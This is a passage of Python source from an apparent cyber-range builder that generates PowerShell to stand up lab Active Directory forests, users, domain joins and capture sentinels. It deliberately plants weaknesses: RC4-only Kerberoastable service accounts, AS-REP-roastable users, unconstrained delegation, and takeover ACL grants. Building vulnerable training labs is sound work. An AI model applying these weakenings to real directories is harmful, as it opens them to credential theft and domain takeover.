    reboot deterministically (and can detect the box coming back — the
    QGA-drop/return handling). `-InstallDns` makes the DC its own DNS; single-DC,
    single-forest. Raises ConfigRenderError if the domain isn't a dotted FQDN.
    Reboot-safe to re-run: the idempotent guard exits if the forest already exists."""
    if not domain_fqdn or "." not in domain_fqdn:
        raise ConfigRenderError(
            f"role: adds needs a dotted domain FQDN (got {domain_fqdn!r}); set the "
            "DC app's provides: [{domain: <fqdn>}] (docs/SLICE_WINDOWS_AD.md §6.1)"
        )
    nb = netbios or netbios_from_fqdn(domain_fqdn)
    fqdn_e = domain_fqdn.replace("'", "''")  # PowerShell single-quote escape
    nb_e = nb.replace("'", "''")
    pw_e = safe_mode_password.replace("'", "''")
    admin_e = admin_password.replace("'", "''")
    return (
        "$ErrorActionPreference='Stop'\n"
        "Import-Module ServerManager\n"
        "Install-WindowsFeature AD-Domain-Services -IncludeManagementTools\n"
        # Deterministic Administrator password -> deterministic domain-admin
        # credential post-promotion (join-host-to-domain uses DOMAIN\Administrator).
        f"net user Administrator '{admin_e}'\n"
        "Import-Module ADDSDeployment\n"
        # Idempotent guard: if this box is already the forest's DC, do nothing
        # (re-running the op must not error on an existing domain).
        "$existing = $null\n"
        "try { $existing = (Get-ADDomain -ErrorAction Stop).DNSRoot } catch {}\n"
        f"if ($existing -eq '{fqdn_e}') {{ Write-Output 'forest already present'; exit 0 }}\n"
        f"$smpw = ConvertTo-SecureString '{pw_e}' -AsPlainText -Force\n"
        f"Install-ADDSForest -DomainName '{fqdn_e}' -DomainNetbiosName '{nb_e}' "
        "-SafeModeAdministratorPassword $smpw -InstallDns -Force "
        "-NoRebootOnCompletion\n"
    )


def _truncate_unique(sanitized: str, original: str, limit: int) -> str:
    """Truncate `sanitized` to `limit` chars; if truncation would drop
    characters, replace the tail with a short deterministic hash of `original`
    (the full, un-truncated value) instead of a bare cut. Two identity_ids that
    differ only past the truncation boundary would otherwise map to the SAME
    SamAccountName/username, and the idempotent skip-if-exists guard then never
    materializes the second account. The hash suffix uses only `[0-9a-f-]`, a
    subset of every charset this is called with (AD SamAccountName, Windows
    local-user, Linux username)."""
    if len(sanitized) <= limit:
        return sanitized
    h = hashlib.sha1(original.encode("utf-8")).hexdigest()[:6]
    head = max(limit - len(h) - 1, 1)
    return (sanitized[:head] + "-" + h)[:limit]


def _domain_to_base_dn(domain_fqdn: str | None) -> str | None:
    """corp.lab -> DC=corp,DC=lab (the AD base distinguished name)."""
    if not domain_fqdn:
        return None
    return ",".join(f"DC={p}" for p in str(domain_fqdn).split(".") if p)


# Dangerous-ACL rights -> the PowerShell ActiveDirectoryAccessRule constructor.
# Broad rights take (sid, right, Allow); extended/property rights add a GUID.
_ACL_SIMPLE_RIGHTS = ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner")
_ACL_GUID_RIGHTS = {
    # ExtendedRight + the control-access GUID.
    "ForceChangePassword": ("ExtendedRight", "00299570-246d-11d0-a768-00aa006e0529"),
    # WriteProperty over the `member` attribute (BloodHound AddMember edge).
    "AddMember": ("WriteProperty", "bf9679c0-0de6-11d0-a285-00aa003049e2"),
}


def _acl_ace_expr(right: str) -> str | None:
    """The PowerShell expression constructing the ActiveDirectoryAccessRule for
    `right` (principal SID is `$psid`). None for an unsupported right."""
    # `[Type]::new(...)` (NOT `New-Object Type(...)`, which won't parse as a method
    # argument inside $acl.AddAccessRule(...)).
    if right in _ACL_SIMPLE_RIGHTS:
        return (
            "[System.DirectoryServices.ActiveDirectoryAccessRule]::new("
            f"$psid,[System.DirectoryServices.ActiveDirectoryRights]::{right},"
            "[System.Security.AccessControl.AccessControlType]::Allow)"
        )
    if right in _ACL_GUID_RIGHTS:
        adright, guid = _ACL_GUID_RIGHTS[right]
        return (
            "[System.DirectoryServices.ActiveDirectoryAccessRule]::new("
            f"$psid,[System.DirectoryServices.ActiveDirectoryRights]::{adright},"
            f"[System.Security.AccessControl.AccessControlType]::Allow,[guid]'{guid}')"
        )
    return None


def _ps_dq_escape(s: str) -> str:
    """Escape a value for safe interpolation inside a PowerShell DOUBLE-quoted
    string that ALSO nests the value inside a single-quoted literal (the
    `-Filter "... -eq '{value}'"` shape at this module's sole call site).
    PowerShell still expands `` ` `` escapes and `$var`/`$(...)` inside
    double quotes even when the substring is ALSO wrapped in nested single
    quotes (single quotes have no special meaning there — only the outer `"`
    governs interpolation) — so an AD target containing `$` (e.g. the computer
    account `WS01$`) would silently mis-evaluate to an unset-variable empty
    string, or `$(...)` would inject. We ALSO have to double any single quote
    in the value (`'` -> `''`) since the value sits inside the nested
    single-quoted literal itself — an apostrophe in the target (e.g. an AD
    display name like `O'Brien`) would otherwise terminate that literal early
    and break the filter (fixed 2026-07-07 review; the pre-refactor code
    doubled `'` but a later pass dropped it while adding the double-quote
    escapes). Order matters: escape the escape character (backtick) first."""
    return (
        s.replace("`", "``")
        .replace("$", "`$")
        .replace('"', '`"')
        .replace("'", "''")
    )


def _render_acl_grant(right: str, target: str) -> list[str]:
    """A dangerous-ACL grant: the current principal ($sam) gets `right` over
    `target` (a user/group). Waits for the target (cross-identity ordering), then
    adds the audit-relevant ACE — the BloodHound takeover edge. Best-effort."""
    ace = _acl_ace_expr(right)
    if ace is None:
        return [f"Write-Output 'axr: ACL right {right} unsupported (skipped)'"]
    t_sam = re.sub(r"[^A-Za-z0-9_.-]", "", target)[:64]
    t_e = target.replace("'", "''")  # single-quoted PS context (Write-Output lines)
    t_dq = _ps_dq_escape(target)  # double-quoted PS context (the -Filter line)
    return [
        "$tdn=$null;",
        "for ($i=0; $i -lt 20 -and -not $tdn; $i++) {",
        f"  $o=Get-ADObject -Filter \"samAccountName -eq '{t_sam}' -or Name -eq '{t_dq}'\""
        " -ErrorAction SilentlyContinue | Select-Object -First 1;",
        "  if ($o) { $tdn=$o.DistinguishedName } else { Start-Sleep 3 }",
        "}",
        "if ($tdn) {",
        "  $psid=(Get-ADUser $sam).SID;",
        "  $acl=Get-Acl -Path \"AD:$tdn\";",
        f"  $acl.AddAccessRule({ace});",
        "  Set-Acl -Path \"AD:$tdn\" -AclObject $acl -ErrorAction SilentlyContinue;",
        f"  Write-Output 'axr: ACL {right} granted to '+$sam+' over {t_e}'",
        f"}} else {{ Write-Output 'axr: ACL target {t_e} not found (skipped)' }}",
    ]


def render_create_domain_user(
    identity_id: str,
    *,
    password: str,
    groups: list[str] | None = None,
    spn: str | None = None,
    ou: str | None = None,
    asrep_roastable: bool = False,
    domain_fqdn: str | None = None,
    acl: list[dict[str, str]] | None = None,
    delegation: str | None = None,
    delegation_to: list[str] | None = None,
) -> str:
    """PowerShell creating one AD domain user via `New-ADUser` on the DC (W2b
    OP-OVL-020, docs/SLICE_WINDOWS_AD.md §6.2; Vulnerable-AD / SPN-OU §9).

    Idempotent: skips creation if the SamAccountName already exists; weakenings are
    (re)asserted on every run so a redo converges. Each `groups` entry is added
    best-effort. Vulnerable-AD modeling:
      - `ou`     -> idempotent New-ADOrganizationalUnit + place the account there.
      - `spn`    -> a Kerberoastable service account; the SPN is set and the account
                    is forced to **RC4** (`msDS-SupportedEncryptionTypes=4`) so the
                    Kerberoast TGS is offline-crackable (and trips the RC4 IDS rule).
      - `asrep_roastable` -> DONT_REQUIRE_PREAUTH (an AS-REP-roastable account).
    Raises ConfigRenderError on an empty id."""
    if not identity_id:
        raise ConfigRenderError("create-domain-user: empty identity id")
    # SamAccountName: <=20 chars, restricted charset. Dedupe-truncate so two
    # identity_ids differing only past char 20 don't collide onto one account.
    sam = _truncate_unique(
        re.sub(r"[^A-Za-z0-9_.-]", "", identity_id), identity_id, 20
    ) or "axruser"
    name_e = identity_id.replace("'", "''")  # PowerShell single-quote escape
    pw_e = password.replace("'", "''")
    base_dn = _domain_to_base_dn(domain_fqdn)
    lines = [
        "$ErrorActionPreference='Stop'",
        "Import-Module ActiveDirectory",
        f"$sam='{sam}'",
        f"$pw=ConvertTo-SecureString '{pw_e}' -AsPlainText -Force",
    ]
    # OU: create idempotently, then place the new account under it (-Path).
    path_arg = ""
    if ou and base_dn:
        ou_e = str(ou).replace("'", "''")
        ou_dn = f"OU={ou_e},{base_dn}"
        lines.append(
            f"if (-not (Get-ADOrganizationalUnit -Filter \"Name -eq '{ou_e}'\" "
            "-ErrorAction SilentlyContinue)) { "
            f"New-ADOrganizationalUnit -Name '{ou_e}' -Path '{base_dn}' "
            "-ProtectedFromAccidentalDeletion $false }"
        )
        path_arg = f" -Path '{ou_dn}'"
    spn_arg = ""
    if spn:
        spn_e = str(spn).replace("'", "''")
        spn_arg = f" -ServicePrincipalNames '{spn_e}'"
    lines += [
        "if (-not (Get-ADUser -Filter \"SamAccountName -eq '$sam'\" -ErrorAction SilentlyContinue)) {",
        f"  New-ADUser -Name '{name_e}' -SamAccountName $sam -AccountPassword $pw "
        f"-Enabled $true -PasswordNeverExpires $true{path_arg}{spn_arg}",
        "}",
    ]
    # Weakenings — (re)asserted on existing accounts too (idempotent convergence).
    if spn:
        lines += [
            f"Set-ADUser -Identity $sam -ServicePrincipalNames @{{Replace='{spn_e}'}} "
            "-ErrorAction SilentlyContinue",
            # Force RC4 so the Kerberoast TGS is crackable (and trips the RC4 IDS rule).
            "Set-ADUser -Identity $sam -Replace @{'msDS-SupportedEncryptionTypes'=4} "
            "-ErrorAction SilentlyContinue  # RC4 only -> Kerberoastable",
        ]
    if asrep_roastable:
        lines.append(
            "Set-ADAccountControl -Identity $sam -DoesNotRequirePreAuth $true "
            "-ErrorAction SilentlyContinue  # AS-REP roastable"
        )
    # Kerberos delegation weakening.
    if delegation and str(delegation).lower() == "unconstrained":
        lines.append(
            "Set-ADAccountControl -Identity $sam -TrustedForDelegation $true "
            "-ErrorAction SilentlyContinue  # unconstrained delegation"
        )
    if delegation_to:
        spns = ",".join(f"'{str(s).replace(chr(39), chr(39) * 2)}'" for s in delegation_to)
        lines.append(
            f"Set-ADUser -Identity $sam -Add @{{'msDS-AllowedToDelegateTo'=@({spns})}} "
            "-ErrorAction SilentlyContinue  # constrained delegation"
        )
        lines.append(
            "Set-ADAccountControl -Identity $sam -TrustedToAuthForDelegation $true "
            "-ErrorAction SilentlyContinue"
        )
    # Dangerous-ACL grants: this principal gets a takeover right over a target.
    for grant in acl or []:
        right = str(grant.get("right") or "").strip()
        target = str(grant.get("target") or "").strip()
        if right and target:
            lines += _render_acl_grant(right, target)
    for g in groups or []:
        g_e = str(g).replace("'", "''")
        lines.append(
            f"try {{ Add-ADGroupMember -Identity '{g_e}' -Members $sam -ErrorAction Stop }} "
            f"catch {{ Write-Output \"axr: group '{g_e}' add skipped: $_\" }}"
        )
    return "\n".join(lines) + "\n"


def render_create_local_user(
    identity_id: str,
    *,
    password: str,
    groups: list[str] | None = None,
    os_family: str = "windows",
) -> str:
    """Create one *local* user on a host (no-`domain:` identity, W2 OP-OVL-020
    local branch — docs/SLICE_WINDOWS_AD.md §6.2/§6.3).

    Windows: `New-LocalUser` + `Add-LocalGroupMember` per group (e.g.
    `Administrators`). Linux: `useradd` + `chpasswd` + `usermod -aG` per group.
    Idempotent on both paths (skip-if-exists / `id` guard), so a redo is safe.
    The (lab-default) password is enabled + non-expiring. Raises ConfigRenderError
    on an empty id."""
    if not identity_id:
        raise ConfigRenderError("create-local-user: empty identity id")
    if (os_family or "windows").lower() == "windows":
        return _render_windows_local_user(identity_id, password, groups)
    return _render_linux_local_user(identity_id, password, groups)


def _render_windows_local_user(
    identity_id: str, password: str, groups: list[str] | None
) -> str:
    # Local username: <=20 chars, no Windows-reserved chars (" / \ [ ] : ; | = , + * ? < > @).
    # Dedupe-truncate (see _truncate_unique) so two long identity_ids sharing a
    # 20-char prefix don't collide onto the same local account.
    user = _truncate_unique(
        re.sub(r'[\"/\\\[\]:;|=,+*?<>@\s]', "", identity_id), identity_id, 20
    ) or "axruser"
    user_e = user.replace("'", "''")
    pw_e = password.replace("'", "''")
    lines = [
        "$ErrorActionPreference='Stop'",
        f"$u='{user_e}'",
        f"$pw=ConvertTo-SecureString '{pw_e}' -AsPlainText -Force",
        "if (-not (Get-LocalUser -Name $u -ErrorAction SilentlyContinue)) {",
        "  New-LocalUser -Name $u -Password $pw -AccountNeverExpires "
        "-PasswordNeverExpires | Out-Null",
        "} else {",
        "  Set-LocalUser -Name $u -Password $pw -PasswordNeverExpires $true",
        "}",
    ]
    for g in groups or []:
        g_e = str(g).replace("'", "''")
        lines.append(
            f"try {{ Add-LocalGroupMember -Group '{g_e}' -Member $u -ErrorAction Stop }} "
            f"catch {{ Write-Output \"axr: local group '{g_e}' add skipped: $_\" }}"
        )
    return "\n".join(lines) + "\n"


def _render_linux_local_user(
    identity_id: str, password: str, groups: list[str] | None
) -> str:
    # Linux username: lowercase, [a-z_][a-z0-9_-]*, <=32. Dedupe-truncate (see
    # _truncate_unique) so two long identity_ids sharing a 32-char prefix don't
    # collide onto the same account.
    base = _truncate_unique(
        re.sub(r"[^a-z0-9_-]", "", identity_id.lower()), identity_id, 32
    ).lstrip("-")
    user = base if re.match(r"^[a-z_]", base or "") else f"u{base}"
    user = user or "axruser"
    user_q = sh_squote(user)
    pw_q = sh_squote(f"{user}:{password}")
    lines = [
        "set -e",
        f"id {user_q} >/dev/null 2>&1 || useradd -m -s /bin/bash {user_q}",
        f"printf '%s' {pw_q} | chpasswd",
    ]
    for g in groups or []:
        g_q = sh_squote(str(g))
        lines.append(
            f"getent group {g_q} >/dev/null 2>&1 && usermod -aG {g_q} {user_q} "
            f"|| echo \"axr: local group {g} add skipped (no such group)\""
        )
    return "\n".join(lines) + "\n"


def sh_squote(s: str) -> str:
    """POSIX single-quote a string for safe shell interpolation."""
    return "'" + s.replace("'", "'\\''") + "'"


def windows_computer_name(hostname: str) -> str:
    """Sanitize a node id to a valid Windows ComputerName: alphanumeric/hyphen
    only, <=15 chars (NetBIOS limit), no leading/trailing hyphen. `member01`
    stays `member01`; `db-srv.corp` -> `db-srv`. Empty -> '' (caller skips)."""
    label = (hostname or "").split(".")[0]
    safe = re.sub(r"[^A-Za-z0-9-]", "-", label).strip("-")[:15].strip("-")
    return safe


def render_windows_set_hostname(hostname: str) -> str:
    r"""PowerShell that renames a Windows guest to `hostname`'s computer name
    (W1 substrate, docs/SLICE_WINDOWS_AD.md §5). The W0/first-boot path doesn't
    apply the IR node id as the ComputerName (the template ships no cloudbase-
    init to consume it), so a clone keeps its OOBE `WIN-xxxx` name and a domain
    join lands under that random name instead of the friendly node id (dev45
    2026-06-18). We rename over QGA before the join; the rename needs a reboot,
    which the backend drives. Idempotent: emits `AXR_RENAMED no` (no reboot
    needed) when the name already matches, else renames and emits `AXR_RENAMED
    yes`. Raises if `hostname` sanitizes to empty."""
    cn = windows_computer_name(hostname)
    if not cn:
        raise ConfigRenderError(f"set-hostname: {hostname!r} has no valid ComputerName")
    cn_e = cn.replace("'", "''")
    return (
        "$ErrorActionPreference='Stop'\n"
        f"if ($env:COMPUTERNAME -ieq '{cn_e}') {{ Write-Output 'AXR_RENAMED no'; exit 0 }}\n"
        f"Rename-Computer -NewName '{cn_e}' -Force\n"
        "Write-Output 'AXR_RENAMED yes'\n"
    )


def render_windows_static_ip(
    ip: str, *, prefix: int, gateway: str | None = None, dns: str | None = None
) -> str:
    r"""PowerShell that pins a Windows guest's physical NIC to a static IPv4
    (W1 substrate, docs/SLICE_WINDOWS_AD.md §5).

    The W0 unattend / first-boot specialization leaves the NIC on DHCP, and the
    template ships no cloudbase-init to consume PVE's NoCloud `ipconfigN`
    network-config — so on an isolated scenario SDN net (no DHCP server) a
    Windows clone falls back to a 169.254/16 APIPA address and cannot route to
    its peers. Single-host deploys never noticed; the first two-Windows-host
    scenario (AD join: member must reach the DC) surfaced it (live dev45
    2026-06-18). The orchestrator therefore applies the static IP it already
    knows (the IR's `nets:` ip/cidr/gateway) directly over the QGA channel,
    once the guest is specialized.

    Idempotent: returns early if the address is already present; otherwise
    clears any DHCP/stale IPv4 + default route on the NIC and sets the static
    address (and gateway/DNS when given). Targets the single physical, up NIC."""
    if not ip:
        raise ConfigRenderError("static-ip: needs an IPv4 address")
    try:
        prefix_i = int(prefix)
    except (TypeError, ValueError):
        raise ConfigRenderError(f"static-ip: bad prefix {prefix!r}")
    if not (0 < prefix_i <= 32):
        raise ConfigRenderError(f"static-ip: prefix out of range ({prefix_i})")
    ip_e = ip.replace("'", "''")
    gw_e = gateway.replace("'", "''") if gateway else None
    dns_e = dns.replace("'", "''") if dns else None
    lines = [
        "$ErrorActionPreference='Stop'",
        # Already pinned to this address -> nothing to do (idempotent).
        f"if (Get-NetIPAddress -AddressFamily IPv4 -IPAddress '{ip_e}' "
        "-ErrorAction SilentlyContinue) { Write-Output 'ip already set'; exit 0 }",
        "$if = Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' } | "
        "Select-Object -First 1",
        "if (-not $if) { Write-Error 'no up physical NIC'; exit 1 }",
        "$idx = $if.ifIndex",
        # Drop DHCP + any stale IPv4 address / default route so the set is clean.
        "Set-NetIPInterface -InterfaceIndex $idx -AddressFamily IPv4 -Dhcp Disabled",
        "Get-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv4 -ErrorAction "
        "SilentlyContinue | Remove-NetIPAddress -Confirm:$false -ErrorAction "
        "SilentlyContinue",
        "Get-NetRoute -InterfaceIndex $idx -AddressFamily IPv4 -DestinationPrefix "
        "'0.0.0.0/0' -ErrorAction SilentlyContinue | Remove-NetRoute "
        "-Confirm:$false -ErrorAction SilentlyContinue",
    ]
    if gw_e:
        lines.append(
            f"New-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv4 "
            f"-IPAddress '{ip_e}' -PrefixLength {prefix_i} -DefaultGateway "
            f"'{gw_e}' | Out-Null"
        )
    else:
        lines.append(
            f"New-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv4 "
            f"-IPAddress '{ip_e}' -PrefixLength {prefix_i} | Out-Null"
        )
    if dns_e:
        lines.append(
            f"Set-DnsClientServerAddress -InterfaceIndex $idx "
            f"-ServerAddresses '{dns_e}'"
        )
    lines.append("Write-Output 'ip set'")
    return "\n".join(lines) + "\n"


def render_join_to_domain(
    domain_fqdn: str, *, dc_ip: str, admin_password: str, netbios: str | None = None
) -> str:
    r"""PowerShell that joins this host to AD domain `domain_fqdn` (W2
    join-host-to-domain, docs/SLICE_WINDOWS_AD.md §6.3).

    Points the host's physical NIC(s) DNS at the DC (so the domain resolves),
    then `Add-Computer` with the `<NETBIOS>\Administrator` credential (the
    deterministic password the DC promotion set). No `-Restart` — the backend
    drives the post-join reboot. Idempotent: exits early if already joined."""
    if not domain_fqdn or "." not in domain_fqdn:
        raise ConfigRenderError(f"join: needs a dotted domain FQDN (got {domain_fqdn!r})")
    nb = netbios or netbios_from_fqdn(domain_fqdn)
    fqdn_e = domain_fqdn.replace("'", "''")
    nb_e = nb.replace("'", "''")
    dc_e = dc_ip.replace("'", "''")
    pw_e = admin_password.replace("'", "''")
    return (
        "$ErrorActionPreference='Stop'\n"
        # Idempotent: already a member of this domain -> nothing to do.
        "$cs = Get-CimInstance Win32_ComputerSystem\n"
        f"if ($cs.PartOfDomain -and $cs.Domain -eq '{fqdn_e}') {{ Write-Output 'already joined'; exit 0 }}\n"
        # Point physical, up NICs' DNS at the DC so the domain resolves.
        "Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' } | "
        f"ForEach-Object {{ Set-DnsClientServerAddress -InterfaceIndex $_.ifIndex -ServerAddresses '{dc_e}' }}\n"
        f"$cred = New-Object System.Management.Automation.PSCredential('{nb_e}\\Administrator', "
        f"(ConvertTo-SecureString '{pw_e}' -AsPlainText -Force))\n"
        f"Add-Computer -DomainName '{fqdn_e}' -Credential $cred -Force\n"
    )


# ---------------------------------------------------------------------------
# OP-OVL data overlay rendering (seed-dataset MVP — docs/SLICE_OVERLAY.md §4)
# ---------------------------------------------------------------------------

_OVERLAY_DIR = "/var/lib/axrange/overlay"
_MAX_DATASET_BYTES = 2 * 1024 ** 3  # 2 GiB guard against an accidental huge file.
# Raised from 100 MiB (2026-07-24, Authority: user): a deliberate crown-jewel
# dataset (corp-enterprise's 2 GiB customer-pii) is a legitimate size, and the
# seeder delivers a small in-guest GENERATOR script (not the bytes over QGA),
# so a large size costs only in-guest disk + generation time, never a huge
# QGA payload. The guard stays a sanity ceiling against a fat-fingered size.

_SIZE_RE = re.compile(r"^\s*(\d+(?:\.\d+)?)\s*([a-zA-Z]*)\s*$")
_SIZE_UNITS = {
    "": 1, "b": 1,
    "k": 1000, "kb": 1000, "ki": 1024, "kib": 1024,
    "m": 1000 ** 2, "mb": 1000 ** 2, "mi": 1024 ** 2, "mib": 1024 ** 2,
    "g": 1000 ** 3, "gb": 1000 ** 3, "gi": 1024 ** 3, "gib": 1024 ** 3,
}


class DatasetRenderError(Exception):
    """A data-overlay entry the seed-dataset engine can't render."""


def parse_size(spec: Any, *, default: int = 1024) -> int:
    """Parse a `synthetic_size` like '10Mi'/'500Ki'/'2048' to bytes (binary
    units = powers of 1024; decimal k/m/g = powers of 1000)."""
    if spec is None or spec == "":
        return default
    m = _SIZE_RE.match(str(spec))
    if not m:
        raise DatasetRenderError(f"bad synthetic_size {spec!r}")
    num, unit = m.group(1), m.group(2).lower()
    if unit not in _SIZE_UNITS:
        raise DatasetRenderError(f"unknown size unit in {spec!r}")
    return int(float(num) * _SIZE_UNITS[unit])


def render_dataset_seeder(entry: dict[str, Any], *, seed: Any) -> str:
    """Render a `DataEntry` to a deterministic in-guest python3 seeder that
    writes a synthetic dataset at `path` (docs/SLICE_OVERLAY.md §4.1). The data
    is *generated* (there is no `content:` field); reproducible from the scenario
    seed folded with the data id, so `reproducible: true` + same seed → identical
    bytes. Raises DatasetRenderError on an unsupported shape.
    """
    data_id = str(entry.get("id") or "dataset")
    path = entry.get("path")
    if not path:
        raise DatasetRenderError(f"data entry {data_id!r} has no path")
    # Authored/specific-content datasets (e.g. CTF flag strings) are a follow-on:
    # the MVP only generates synthetic data.
    if entry.get("content") is not None or entry.get("from") is not None:
        raise DatasetRenderError(
            f"data entry {data_id!r}: authored content (`content:`/`from:`) is not "
            "yet supported; the MVP generates synthetic data (docs/SLICE_OVERLAY.md §4.1)"
        )
    size = parse_size(entry.get("synthetic_size"))
    if size > _MAX_DATASET_BYTES:
        raise DatasetRenderError(
            f"data entry {data_id!r}: synthetic_size {size} exceeds the "
            f"{_MAX_DATASET_BYTES}-byte guard"
        )
    classification = str(entry.get("classification") or "unclassified")
    crown = bool(entry.get("crown_jewel"))
    # Stable, process-independent fold (NOT python hash(), which is salted).
    base = int(seed) if isinstance(seed, int) else 0
    eff_seed = (base ^ (zlib.crc32(data_id.encode()) & 0xFFFFFFFF)) & 0xFFFFFFFF
    header = (
        f"# axRange synthetic dataset: {data_id}\n"
        f"# classification: {classification}\n"
        f"# crown_jewel: {crown}\n"
        f"# size: {size} bytes\n"
    )
    return (
        "#!/usr/bin/env python3\n"
        f"# axRange dataset seeder: {data_id}\n"
        "import os, random\n"
        f"TARGET = {path!r}\n"
        f"SIZE = {size}\n"
        f"SEED = {eff_seed}\n"
        f"HEADER = {header!r}\n"
        "os.makedirs(os.path.dirname(TARGET) or '.', exist_ok=True)\n"
        "random.seed(SEED)\n"
        "hdr = HEADER.encode()\n"
        "with open(TARGET, 'wb') as f:\n"
        "    f.write(hdr)\n"
        "    rem = max(0, SIZE - len(hdr))\n"
        "    while rem > 0:\n"
        "        n = min(65536, rem)\n"
        "        f.write(random.randbytes(n))\n"
        "        rem -= n\n"
        "print('seeded', TARGET, os.path.getsize(TARGET), 'bytes')\n"
    )


def overlay_seeder_path(data_id: str) -> str:
    """Deterministic in-guest path for a dataset's seeder script."""
    return f"{_OVERLAY_DIR}/{_ACT_SAFE.sub('-', data_id)}-seed.py"


# ---------------------------------------------------------------------------
# OP-MIR-040 verify-capture — deploy-time capture heartbeat
# (docs/design/06-taps-sensors.md)
# ---------------------------------------------------------------------------

_CAPTURE_DIR = "/var/lib/axrange/capture"
# Windows counterpart (mirrors `_WIN_PROVISION_DIR` in backend.py -- a
# dedicated capture-scoped dir, not the provision one, same split as the
# Linux `_CAPTURE_DIR`/`_PROVISION_DIR` pair).
_WIN_CAPTURE_DIR = r"C:\axrange\capture"


def capture_sentinel_token(deploy_id: str, bridge: str) -> str:
    """A short, unique, ASCII-grep-friendly token encoding (deploy_id, bridge).

    Form `AXR<8 hex>` (11 chars). Carried in the ICMP echo payload (via `ping -p`
    hex) so it survives the GRE path and is matchable at the sensor by either a
    tshark `frame contains` filter or a `tcpdump -A | grep`. 11 ASCII chars = 22
    hex bytes, well under `ping -p`'s 16-byte cap when we send only the 4-byte
    `AXR\\0`-free prefix; we keep the token <=16 bytes by construction (see
    `capture_sentinel_hex`). Small to fit the GRE MTU (§11)."""
    import hashlib

    h = hashlib.sha256(f"{deploy_id}|{bridge}".encode()).hexdigest()[:8]
    return f"AXR{h}"


def capture_sentinel_hex(token: str) -> str:
    """The `ping -p` hex pattern for a sentinel token, capped at 16 bytes (the
    `ping -p` maximum). The token is ASCII so this is its hex encoding."""
    return token.encode("ascii")[:16].hex()


def capture_sentinel_runner_path(net_id: str, sensor_id: str) -> str:
    """Deterministic in-guest path for a (net, sensor) sentinel injector script."""
    safe = _ACT_SAFE.sub("-", f"{net_id}-{sensor_id}")
    return f"{_CAPTURE_DIR}/sentinel-{safe}.sh"


def capture_sentinel_runner_path_windows(net_id: str, sensor_id: str) -> str:
    """Windows counterpart of `capture_sentinel_runner_path` — same (net,
    sensor)-keyed name, `.ps1` under `_WIN_CAPTURE_DIR` instead of `.sh` under
    `_CAPTURE_DIR`."""
    safe = _ACT_SAFE.sub("-", f"{net_id}-{sensor_id}")
    return f"{_WIN_CAPTURE_DIR}\\sentinel-{safe}.ps1"


def render_capture_sentinel(
    *, token: str, count: int = 20, target: str | None = None
) -> str:
    """Render the in-guest sentinel injector (run over QGA on the injector).

    Sends `count` ICMP echoes carrying the token in the payload. `target` is a
    same-segment address to ping (its own NIC's broadcast by default, so a
    tapped or untapped injector's frames are caught by some tap on the bridge —
    broadcast hits every tap; unicast to a tapped host hits that host's mirror).
    Best-effort: ping nonzero exit (no reply) is fine — what matters is the
    frames egressing the injector's NIC, which the tap mirrors regardless of a
    reply. Self-contained POSIX sh."""
    hexpat = capture_sentinel_hex(token)
    # Default target: the all-hosts broadcast on the injector's primary iface, so
    # the sentinel is seen by every tap on the bridge even with no specific peer.
    tgt = target or "255.255.255.255"
    q_tgt = tgt.replace("'", "'\\''")
    return (
        "#!/bin/sh\n"
        "# axRange verify-capture sentinel injector "
        "(docs/design/06-taps-sensors.md).\n"
        f"# token={token}\n"
        "set -u\n"
        f"TOKEN='{token}'\n"
        f"HEXPAT='{hexpat}'\n"
        f"TARGET='{q_tgt}'\n"
        f"COUNT={int(count)}\n"
        "# -b: allow broadcast; -p: payload pattern carrying the token bytes.\n"
        '# Best-effort; -W small so we do not block. Failure to get a reply is\n'
        "# fine -- the tap mirrors the egressing request frames either way.\n"
        'ping -b -c "$COUNT" -i 0.2 -W 1 -p "$HEXPAT" "$TARGET" '
        ">/dev/null 2>&1 || true\n"
        "echo \"axrange-sentinel-sent $TOKEN\"\n"
    )


def render_capture_sentinel_windows(
    *, token: str, target: str, count: int = 20
) -> str:
    """Windows counterpart of `render_capture_sentinel` (run over QGA as
    PowerShell on a Windows injector — a Windows host has no POSIX `ping -p`).

    Carries the SAME token bytes the Linux sentinel sends via `ping -p`: the
    `buffer` argument to .NET `System.Net.NetworkInformation.Ping.Send`(host,
    timeout, buffer) IS the ICMP echo payload, so
    `[System.Text.Encoding]::ASCII.GetBytes($token)` puts the identical ASCII
    token bytes on the wire and the sensor's EXISTING `capture_confirm_command`
    (`frame contains <hex>` / `grep AXR<hex>`) matches it unchanged — no
    sensor-side change needed.

    `target` MUST be a concrete unicast address on the segment (the segment's
    gateway — the multi-homed router's IP on this net), never a broadcast
    address: unlike POSIX `ping -b`, .NET `Ping.Send` does not reliably
    deliver a broadcast echo, so `render_capture_sentinel`'s
    `255.255.255.255` default has no Windows equivalent here. A unicast
    frame to an on-segment IP still floods to every port on that segment's
    bridge (including a boundary tap's mirrored router leg) — the same
    L2-flood reasoning `_select_verify_injector`'s bystander-leaf case
    already relies on, just via unicast instead of broadcast. Raises
    `ConfigRenderError` if `target` is empty — a Windows sentinel with no
    resolvable gateway cannot be rendered at all (fail loud, not a silent
    broadcast fallback that would just never arrive).

    Self-contained PowerShell. LES-036: `token`/`target` are embedded via
    SINGLE-quoted PowerShell literals (doubled embedded `'`, no `$`/backtick
    interpolation risk) — never double-quoted string interpolation."""
    if not target:
        raise ConfigRenderError(
            "render_capture_sentinel_windows: no gateway target resolvable — "
            "a Windows sentinel cannot fall back to broadcast (unlike the "
            "Linux sentinel); the injector's segment needs a multi-homed "
            "router leg to resolve a gateway IP from"
        )
    token_e = token.replace("'", "''")  # PowerShell single-quote escape
    target_e = target.replace("'", "''")
    return (
        "# axRange verify-capture sentinel injector (Windows) "
        "(docs/design/06-taps-sensors.md).\n"
        "$ErrorActionPreference = 'Continue'\n"
        f"$token = '{token_e}'\n"
        f"$targetHost = '{target_e}'\n"
        f"$count = {int(count)}\n"
        "$buffer = [System.Text.Encoding]::ASCII.GetBytes($token)\n"
        "$ping = [System.Net.NetworkInformation.Ping]::new()\n"
        "for ($i = 0; $i -lt $count; $i++) {\n"
        "  try {\n"
        "    $null = $ping.Send($targetHost, 1000, $buffer)\n"
        "  } catch { }\n"
        "  Start-Sleep -Milliseconds 200\n"
        "}\n"
        "Write-Output \"axrange-sentinel-sent $token\"\n"
    )


def capture_confirm_command(*, iface: str, token: str, timeout_s: int) -> str:
    """The sensor-side confirm command (run over mgmt-SSH on the sensor).

